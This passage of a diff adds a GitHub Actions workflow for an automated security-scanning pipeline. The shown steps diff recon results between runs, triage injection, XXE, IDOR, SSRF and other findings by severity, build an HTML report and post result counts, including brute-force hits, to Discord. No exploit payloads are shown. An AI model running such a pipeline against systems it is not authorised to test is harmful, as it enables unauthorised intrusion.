+                echo "_No previous snapshot for this target yet - this is the baseline run._"
+              fi
+              echo ""
+            } >> "$RD/diff/diff.md"
+          }
+          echo "# 🆚 Diff vs Previous Scan of ${{ env.TARGET }}" > "$RD/diff/diff.md"
+          echo "" >> "$RD/diff/diff.md"
+          diff_section "Subdomains" ".previous_snapshot/subdomains.txt" "$RD/subdomains/all_subs.txt"
+          diff_section "Live_Hosts" ".previous_snapshot/live.txt" "$RD/live/live.txt"
+          diff_section "URLs" ".previous_snapshot/urls.txt" "$RD/urls/all.txt"
+          echo "✅ Diff report written to diff/diff.md"
+
+      # ============================================================
+      # SAVE SNAPSHOT
+      # ============================================================
+      - name: "💾 Save Current Scan Snapshot"
+        continue-on-error: true
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          RD="results/${{ env.TIMESTAMP }}"
+          mkdir -p .previous_snapshot
+          cp "$RD/subdomains/all_subs.txt" .previous_snapshot/subdomains.txt 2>/dev/null || touch .previous_snapshot/subdomains.txt
+          cp "$RD/live/live.txt" .previous_snapshot/live.txt 2>/dev/null || touch .previous_snapshot/live.txt
+          cp "$RD/urls/all.txt" .previous_snapshot/urls.txt 2>/dev/null || touch .previous_snapshot/urls.txt
+          gh cache delete "snapshot-${{ env.TARGET }}" 2>/dev/null || true
+
+      - name: "💾 Save Snapshot Cache"
+        if: always()
+        continue-on-error: true
+        uses: actions/cache/save@v4
+        with:
+          path: .previous_snapshot
+          key: snapshot-${{ env.TARGET }}
+
+      # ============================================================
+      # TRIAGE
+      # ============================================================
+      - name: "📋 Triage & Prioritization"
+        if: always()
+        continue-on-error: true
+        timeout-minutes: 3
+        run: |
+          python3 << 'PYEOF'
+import json, os
+
+rd = "results/" + os.environ.get("TIMESTAMP", "")
+SEV_RANK = {"critical": 5, "high": 4, "medium": 3, "low": 2, "info": 1, "unknown": 0}
+
+def rl(path):
+    try:
+        with open(os.path.join(rd, path)) as f:
+            return [l.strip() for l in f if l.strip()]
+    except Exception:
+        return []
+
+confirmed = []
+for line in rl("nuclei/findings.jsonl"):
+    try:
+        j = json.loads(line)
+        sev = j.get("info", {}).get("severity", "unknown").lower()
+        name = j.get("info", {}).get("name", j.get("template-id", "unknown"))
+        host = j.get("host", j.get("matched-at", ""))
+        confirmed.append((SEV_RANK.get(sev, 0), sev, "Nuclei", f"{name} @ {host}"))
+    except Exception:
+        continue
+
+for l in rl("ai_agent/injection_findings.txt"):
+    sev = "high" if any(k in l for k in ["SQLi", "SSTI", "RCE", "Command"]) else "medium"
+    confirmed.append((SEV_RANK[sev], sev, "Injection", l))
+for l in rl("ai_agent/xxe_findings.txt"):
+    if l.startswith("[XXE]"):
+        confirmed.append((SEV_RANK["high"], "high", "XXE", l))
+for l in rl("ai_agent/idor_findings.txt"):
+    if l.startswith("[IDOR]"):
+        confirmed.append((SEV_RANK["medium"], "medium", "IDOR", l))
+for l in rl("ai_agent/graphql_findings.txt"):
+    if l.startswith("[GRAPHQL"):
+        confirmed.append((SEV_RANK["medium"], "medium", "GraphQL", l))
+for l in rl("cors/vulnerable.txt"):
+    confirmed.append((SEV_RANK["medium"], "medium", "CORS", l))
+for l in rl("files/sensitive.txt"):
+    confirmed.append((SEV_RANK["high"], "high", "Sensitive File", l))
+for l in rl("nuclei/takeover.jsonl"):
+    confirmed.append((SEV_RANK["high"], "high", "Subdomain Takeover", l[:200]))
+for l in rl("ai_agent/race_conditions.txt"):
+    if l.startswith("[RACE"):
+        confirmed.append((SEV_RANK["medium"], "medium", "Race Condition", l))
+for l in rl("ai_agent/mass_assignment.txt"):
+    if l.startswith("[MASS"):
+        confirmed.append((SEV_RANK["medium"], "medium", "Mass Assignment", l))
+for l in rl("ai_agent/oob_findings.txt"):
+    if l.startswith("[OOB"):
+        confirmed.append((SEV_RANK["high"], "high", "OOB/SSRF", l))
+
+confirmed.sort(key=lambda x: -x[0])
+leads = []
+for l in rl("js/github_recon.txt"):
+    leads.append(("GitHub Exposure", l))
+for l in rl("live/vhosts.txt"):
+    leads.append(("Hidden VHost", l))
+for l in rl("fuzzing/discovered.txt"):
+    leads.append(("Content Discovery", l))
+
+lines = [f"# 🎯 Triage & Prioritization\n"]
+lines.append(f"**{len(confirmed)} confirmed findings** · **{len(leads)} recon leads**\n")
+lines.append("---\n\n## 🔴 Confirmed Findings\n")
+if confirmed:
+    for rank, sev, cat, detail in confirmed:
+        badge = {"critical":"🟣 CRITICAL","high":"🔴 HIGH","medium":"🟠 MEDIUM","low":"🟡 LOW"}.get(sev, "⚪ INFO")
+        lines.append(f"- **[{badge}]** `{cat}` — {detail[:200]}")
+else:
+    lines.append("_None this run._")
+lines.append("\n---\n\n## 🟡 Recon Leads\n")
+if leads:
+    for cat, detail in leads:
+        lines.append(f"- `{cat}` — {detail[:200]}")
+else:
+    lines.append("_None this run._")
+
+os.makedirs(os.path.join(rd, "triage"), exist_ok=True)
+with open(os.path.join(rd, "triage", "triage.md"), "w") as f:
+    f.write("\n".join(lines))
+print(f"✅ Triage completed")
+PYEOF
+
+      # ============================================================
+      # HTML REPORT EXPORT
+      # ============================================================
+      - name: "📄 Professional Report Export"
+        if: always()
+        continue-on-error: true
+        timeout-minutes: 3
+        run: |
+          python3 << 'PYEOF'
+import os, datetime
+
+rd = "results/" + os.environ.get("TIMESTAMP", "")
+target = os.environ.get("TARGET", "")
+
+try:
+    import markdown as md
+except ImportError:
+    md = None
+
+def rf(path):
+    try:
+        with open(os.path.join(rd, path)) as f:
+            return f.read()
+    except Exception:
+        return ""
+
+sections = []
+triage = rf("triage/triage.md")
+if triage:
+    sections.append(triage)
+report = rf("ai/security_report.md")
+if report:
+    sections.append(report)
+diff = rf("diff/diff.md")
+if diff:
+    sections.append(diff)
+
+combined_md = "\n\n---\n\n".join(sections) if sections else "# No data collected this run."
+
+if md:
+    body_html = md.markdown(combined_md, extensions=["tables", "fenced_code"])
+else:
+    body_html = "<pre>" + combined_md.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;") + "</pre>"
+
+html = f"""<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Security Report - {target}</title>
+<style>
+  body {{ font-family: -apple-system, Segoe UI, Roboto, Arial, sans-serif; max-width: 900px; margin: 0 auto; padding: 40px 24px; color: #1a1a2e; line-height: 1.6; background: #fafafa; }}
+  h1 {{ border-bottom: 3px solid #e63946; padding-bottom: 10px; }}
+  h2 {{ border-bottom: 1px solid #ddd; padding-bottom: 6px; margin-top: 36px; }}
+  code {{ background: #eee; padding: 2px 6px; border-radius: 4px; font-size: 0.9em; }}
+  pre {{ background: #1e1e2e; color: #e0e0e0; padding: 16px; border-radius: 8px; overflow-x: auto; }}
+  table {{ border-collapse: collapse; width: 100%; margin: 16px 0; }}
+  th, td {{ border: 1px solid #ddd; padding: 8px 12px; text-align: left; }}
+  th {{ background: #f0f0f0; }}
+  .header-bar {{ background: #1a1a2e; color: white; padding: 20px 24px; border-radius: 8px; margin-bottom: 24px; }}
+  .header-bar h1 {{ border: none; margin: 0; color: white; }}
+  .header-bar p {{ margin: 6px 0 0; opacity: 0.8; }}
+  li {{ margin: 4px 0; }}
+</style>
+</head>
+<body>
+<div class="header-bar">
+  <h1>🛡️ Security Assessment Report</h1>
+  <p>Target: <strong>{target}</strong> &nbsp;|&nbsp; Generated: {datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}</p>
+</div>
+{body_html}
+</body>
+</html>"""
+
+os.makedirs(os.path.join(rd, "report"), exist_ok=True)
+with open(os.path.join(rd, "report", "final_report.html"), "w") as f:
+    f.write(html)
+print(f"✅ Professional HTML report generated")
+PYEOF
+
+      # ============================================================
+      # UPLOAD ARTIFACTS
+      # ============================================================
+      - name: "📦 Upload Toolchain Artifact"
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: toolchain-${{ env.TIMESTAMP }}
+          path: /tmp/toolbin/
+          retention-days: 7
+          if-no-files-found: ignore
+
+      - name: "📤 Upload Results Artifact"
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: results-${{ env.TIMESTAMP }}-${{ env.TARGET }}
+          path: results/${{ env.TIMESTAMP }}/
+          retention-days: 30
+
+      # ============================================================
+      # DISCORD NOTIFICATION
+      # ============================================================
+      - name: "📣 Discord Notification"
+        if: ${{ always() && fromJSON(inputs.discord_notify) && env.DISCORD_WEBHOOK != '' }}
+        continue-on-error: true
+        timeout-minutes: 3
+        run: |
+          RD="results/${{ env.TIMESTAMP }}"
+          SUBS=$(wc -l < "$RD/subdomains/all_subs.txt" 2>/dev/null || true); SUBS=${SUBS:-0}
+          LIVE=$(wc -l < "$RD/live/live.txt" 2>/dev/null || true); LIVE=${LIVE:-0}
+          INJECT=$(grep -cE '\[(XSS|SSTI|SQLi|LFI|SSRF|Command|Redirect|NoSQLi)\]' "$RD/ai_agent/injection_findings.txt" 2>/dev/null || true); INJECT=${INJECT:-0}
+          XXE=$(grep -c '\[XXE\]' "$RD/ai_agent/xxe_findings.txt" 2>/dev/null || true); XXE=${XXE:-0}
+          GQL=$(grep -c '\[GRAPHQL' "$RD/ai_agent/graphql_findings.txt" 2>/dev/null || true); GQL=${GQL:-0}
+          IDOR=$(grep -c '\[IDOR\]' "$RD/ai_agent/idor_findings.txt" 2>/dev/null || true); IDOR=${IDOR:-0}
+          NUCLEI=$(wc -l < "$RD/nuclei/findings.jsonl" 2>/dev/null || true); NUCLEI=${NUCLEI:-0}
+          SENS=$(wc -l < "$RD/files/sensitive.txt" 2>/dev/null || true); SENS=${SENS:-0}
+          CORS=$(wc -l < "$RD/cors/vulnerable.txt" 2>/dev/null || true); CORS=${CORS:-0}
+          TOTAL_AGENT=$(( INJECT + XXE + GQL + IDOR ))
+          BRUTE=$(ls "$RD/ai_agent/brute"/*.txt 2>/dev/null | wc -l || echo 0)
+          RACE=$(grep -c '\[RACE' "$RD/ai_agent/race_conditions.txt" 2>/dev/null || true); RACE=${RACE:-0}
+          MASS=$(grep -c '\[MASS' "$RD/ai_agent/mass_assignment.txt" 2>/dev/null || true); MASS=${MASS:-0}
+          OOB=$(grep -c '\[OOB' "$RD/ai_agent/oob_findings.txt" 2>/dev/null || true); OOB=${OOB:-0}
+          BLOCK_PCT=${{ env.SCAN_BLOCK_PCT }}
+
+          COLOR=5814783; TITLE="✅ Scan Complete"
+          if [ "$TOTAL_AGENT" -gt 0 ] || [ "$SENS" -gt 0 ] || [ "$CORS" -gt 0 ] || [ "$BRUTE" -gt 0 ]; then
+            COLOR=15158332; TITLE="🚨 Vulnerabilities Found"
+          elif [ "$NUCLEI" -gt 5 ]; then
+            COLOR=16744192; TITLE="🔶 Findings Require Review"
+          fi
+
+          jq -n \
+            --arg t "${{ env.TARGET }}" \
+            --arg title "$TITLE" \
+            --arg subs "$SUBS" \
+            --arg live "$LIVE" \
+            --arg inject "$INJECT" \
+            --arg xxe "$XXE" \
+            --arg gql "$GQL" \
+            --arg idor "$IDOR" \
+            --arg nuclei "$NUCLEI" \
+            --arg sens "$SENS" \
+            --arg cors "$CORS" \
+            --arg brute "$BRUTE" \
+            --arg race "$RACE" \
+            --arg mass "$MASS" \
+            --arg oob "$OOB" \
+            --arg block "$BLOCK_PCT" \
+            --arg run "${{ github.run_number }}" \
+            --arg url "https://github.com/${{ github.repository }}/actions/runs/${{ github.run_id }}" \
+            --argjson color "$COLOR" \
+          '{
+            username:"🐐 Leo Messi AI",
+            embeds:[{
+              title:($title+": "+$t), color:$color, url:$url,
+              fields:[
+                {name:"🌐 Recon", value:("Subs: **"+$subs+"** | Live: **"+$live+"** | WAF: **"+$block+"%**"), inline:false},
+                {name:"🧠 AI Agent", value:("Injections: **"+$inject+"** | XXE: **"+$xxe+"** | GraphQL: **"+$gql+"** | IDOR: **"+$idor+"**"), inline:false},
+                {name:"🔬 Scanner", value:("Nuclei: **"+$nuclei+"** | Secrets: **"+$sens+"** | CORS: **"+$cors+"** | Brute: **"+$brute+"**"), inline:false},
+                {name:"⚡ Advanced", value:("Race: **"+$race+"** | Mass: **"+$mass+"** | OOB: **"+$oob+"**"), inline:false},
+                {name:"🔗 Results", value:("[View Run]("+$url+")"), inline:true}
+              ],
+              footer:{text:("Run #"+$run+" | Mode: ${{ env.HUNTING_MODE }} | Leo Messi AI Autonomous Hunter ULTIMATE v4")}
+            }]
+          }' | curl -s -X POST "${{ env.DISCORD_WEBHOOK }}" -H "Content-Type: application/json" -d @- || true
